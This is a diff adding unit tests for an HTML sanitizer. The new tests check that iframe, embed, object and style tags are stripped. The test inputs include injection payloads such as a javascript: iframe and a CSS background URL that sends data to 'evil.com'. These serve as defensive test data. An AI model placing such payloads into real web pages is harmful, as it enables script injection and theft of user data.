@@ -84,4 +84,40 @@ describe('sanitizePlaygroundHtml', () => {
     expect(result).not.toContain('onerror=')
     expect(result).toContain('Safe content')
   })
+
+  it('should strip iframe tags to prevent content injection', () => {
+    const input = '<div><iframe src="javascript:alert(1)"></iframe><p>Safe</p></div>'
+    const result = sanitizePlaygroundHtml(input)
+
+    expect(result).not.toContain('<iframe')
+    expect(result).not.toContain('</iframe>')
+    expect(result).toContain('Safe')
+  })
+
+  it('should strip embed tags', () => {
+    const input = '<div><embed src="evil.swf" /><p>Safe</p></div>'
+    const result = sanitizePlaygroundHtml(input)
+
+    expect(result).not.toContain('<embed')
+    expect(result).toContain('Safe')
+  })
+
+  it('should strip object tags', () => {
+    const input = '<div><object data="evil.swf"></object><p>Safe</p></div>'
+    const result = sanitizePlaygroundHtml(input)
+
+    expect(result).not.toContain('<object')
+    expect(result).not.toContain('</object>')
+    expect(result).toContain('Safe')
+  })
+
+  it('should strip style tags to prevent CSS exfiltration', () => {
+    const input = '<div><style>body { background: url("https://evil.com/steal?data=") }</style><p>Safe</p></div>'
+    const result = sanitizePlaygroundHtml(input)
+
+    expect(result).not.toContain('<style')
+    expect(result).not.toContain('</style>')
+    expect(result).not.toContain('evil.com')
+    expect(result).toContain('Safe')
+  })
 })
